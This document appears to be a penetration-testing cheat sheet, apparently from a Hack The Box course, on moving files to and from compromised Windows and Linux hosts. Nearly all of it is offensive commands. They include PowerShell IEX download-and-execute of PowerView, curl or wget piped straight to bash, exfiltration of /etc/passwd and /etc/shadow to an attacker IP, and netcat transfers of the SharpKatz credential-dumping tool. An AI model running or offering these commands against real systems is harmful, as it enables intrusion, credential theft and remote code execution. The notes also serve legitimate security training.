# **File Transfers**

## **File Transfer Methods**
### **Windows File Transfer Methods**

#### <span class="red-command">Downloading files from Linux to Windows</span>
<code class="invert">Via base64 encode-decode method</code>
```bash
cat ~/.ssh/id_rsa | base64 -w 0 | xclip -selection clipboard
```

``` powershell
PS C:\Users> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(<BASE64_ENCODED_CONTENTS_OF_A_FILE>))
PS C:\Users> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

<code class="invert">Via SMB share</code>
```
sudo impacket-smbserver share -smb2support file-transfer -user redparrot -password toor


xfreerdp /u:<username> /p:'<password>' /v:<RDP_SERVER>
C:\Users\ghost> net use n: \\<TUN0_IP>\share /user:redparrot toor
C:\Users\ghost> net copy n:\file.zip
C:\Users\ghost> powershell
PS C:\Users\ghost> Expand-Archive -Path yourfile.zip -DestinationPath .
PowerShell> cd N:
PS N:> hasher file.txt > hash.txt 
PS N:> exit

# unmount the share N from windows, exit from RDP, stop sharing the share via SMB
# Navigate to the share and get hash.txt
```

<code class="invert">PowerShell Web Downloads</code>

```powershell
PS C:\Users> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\Users> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\Users> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\Users> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

<code class="invert">PowerShell Invoke-WebRequest</code>
```powershell
PS C:\Users> Invoke-WebRequest https://192.168.45.2/PowerView.ps1 -UseBasicParsing | IEX

# Disable SSL/TLS secure channel
PS C:\Users> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
PS C:\Users> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

<code class="invert">FTP Downloads</code>
```bash
redparrot@parrot~$ sudo python3 -m pyftpdlib --port 21
```

```powershell
PS C:\Users> (New-Object Net.WebClient).DownloadFile('ftp://<FTP_SERVER_IP>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Create a Command File for the FTP Client and Download the Target File.  
Helpful in scenarios where we don't have an interactive shell in the remote server.
```powershell
C:\Users> echo open <FTP_SERVER_IP> > ftpcommand.txt
C:\Users> echo USER anonymous >> ftpcommand.txt
C:\Users> echo binary >> ftpcommand.txt
C:\Users> echo GET file.txt >> ftpcommand.txt
C:\Users> echo bye >> ftpcommand.txt
C:\Users> ftp -v -n -s:ftpcommand.txt
ftp> open <FTP_SERVER_IP>
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\Users>more file.txt
This is a test file
```

#### <span class="red-command">Uploading files from Windows to Linux</span>
<code class="invert">PowerShell Base64 Encode & Decode</code>
```powershell
# Base64 encode the /etc/hosts file using powershell
PS C:\Users> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

<BASE_64_ENCODED_CONTENTS_OF_FILE>
PS C:\Users> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
4388374325B992DEF12793500307AA34

# Decode the string in linux
echo "<BASE_64_ENCODED_CONTENTS_OF_FILE>" | base64 -d; xclip -selection clipboard
```

<code class="invert">PowerShell Web Uploads</code>
```bash
python3 -m uploadserver 8080
```

```powershell
# Upload the file to python upload server running on Linux
PS C:\Users> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\Users> Invoke-FileUpload -Uri http://192.168.49.128:8080/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

<code class="invert">PowerShell Base64 Web Upload</code>
```powershell
PS C:\Users> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\Users> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

# In the linux VM
redparrot@parrot~$ nc -lvnp 8000

# catch the base64 encoded data and decode it in linux
redparrot@parrot~$ echo <base64> | base64 -d -w 0 > hosts
```

<code class="invert">SMB Uploads</code>
```
redparrot@parrot~$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```cmd
# Connecting to the Webdav Share from Windows
C:\Users> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

<code class="invert">Uploading Files using SMB</code>
```
C:\Users> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\Users> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

<code class="invert">FTP Uploads</code>

```bash
redparrot@parrot~$ sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://<FTP_SERVER_IP>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### **Linux File Transfer Methods**
#### <span class="red-command">Downloading files from remote host to Linux</span>
<code class="invert">Web Downloads with Wget and cURL</code>

```bash
wget <URL> -O /path/to/file.ext
```

```bash
curl -o /path/to/file.ext <URL>
```

<code class="invert">Fileless downloads</code>

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

<code class="invert">Download with Bash (/dev/tcp)</code>
There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

<code class="invert">SSH Downloads</code>
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

#### <span class="red-command">Uploading files from remote host to Linux</span>
<code class="invert">Web Upload</code>  
Setting up a python upload server with SSL/TLS enabled.

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
python3 -m uploadserver 443 --server-certificate ~/server.pem
```

<code class="invert">Linux - Upload Multiple Files</code>

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

<code class="invert">Linux - Creating a Web Server with Python3</code>

```bash
python3 -m http.server 9001
```

<code class="invert">Linux - Creating a Web Server with Python2.7</code>

```bash
python2.7 -m SimpleHTTPServer
```

<code class="invert">Linux - Creating a Web Server with PHP</code>

```php
php -S 0.0.0.0:9000
```

<code class="invert">Linux - Creating a Web Server with Ruby</code>

```ruby
ruby -run -ehttpd . -p8000
```

<code class="invert">Linux - Uploding and downloading files via SCP</code>  
Download a file from remote host via SSH key

```bash
scp -i ~/.ssh/secret_key username@<DNS/IP>:/home/redparrot/downloadme.txt /tmp/downloaded.txt
```

Upload a file from remote host via SSH key
```bash
scp -i ~/.ssh/secret_key /tmp/uploadme.txt username@<DNS/IP>:/home/redparrot/uploaded.txt
```

Via password based authentication
```bash
scp /etc/passwd redparrot@10.129.86.90:/home/redparrot/
```

### **Transferring Files with Code**
File download - <code class="invert">Python3</code>

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
Fileless download - <code class="invert">PHP</code>

```bash
php -r '$lines = @file("<URL_TO_CODE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

File download - <code class="invert">Ruby</code>

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

File download - <code class="invert">Perl</code>

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
File download - <code class="invert">JavaScript</code>

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

File download - <code class="invert">JavaScript & cscript</code>
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

File download - <code class="invert">VBScript</code>  
`wget.vbs`

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
```powershell
C:\Users> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```


<code class="invert">Upload Operations using Python3</code>
```bash
python3 -m uploadserver 9001
```

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### **Miscellaneous File Transfer Methods**
#### <span class="red-command">NetCat</span>
Compromised Machine - Listening on Port 9000

```bash
nc -l -p 9000 > SharpKatz.exe
```

Attack Host - Sending File to Compromised machine
```bash
redparrot@parrot$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
redparrot@parrot$ # Example using Original Netcat
r3dp4rrot@htb[/htb]$ nc -q 0 <ATTACKER'S_MACHINE> 9000 < SharpKatz.exe
```

The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.  

Attack Host - Sending File as Input to Netcat
```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Compromised Machine Connect to Netcat to Receive the File
```bash
nc 192.168.49.128 443 > SharpKatz.exe
```


#### <span class="red-command">Ncat</span>
Compromised Machine - Listening on Port 9000.
```bash
ncat -l -p 9000 --recv-only > SharpKatz.exe
```

Attack Host - Sending File to Compromised machine.
```bash
ncat --send-only 192.168.49.128 9000 < SharpKatz.exe
```

Attack Host - Sending File as Input to Netcat
```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Compromised Machine Connect to Netcat to Receive the File
```bash
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

#### <span class="red-command">/dev/tcp</span>
If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file `/dev/TCP/`.  
Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.


Compromised Machine Connecting to Netcat Using `/dev/tcp` to Receive the File
```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

#### <span class="red-command">Powershell remoting</span>
Useful for scenarios where HTTP, HTTPS, or SMB are unavailable. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.  

Test the connection to computer DATABASE01
```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Create a PowerShell Remoting session to DATABASE01
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

Copy samplefile.txt from our Localhost to the DATABASE01 Session
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

Copy DATABASE.txt from DATABASE01 Session to our Localhost
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

#### <span class="red-command">RDP</span>
`rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

Mounting a Linux Folder Using rdesktop
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

Mounting a Linux Folder Using xfreerdp
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
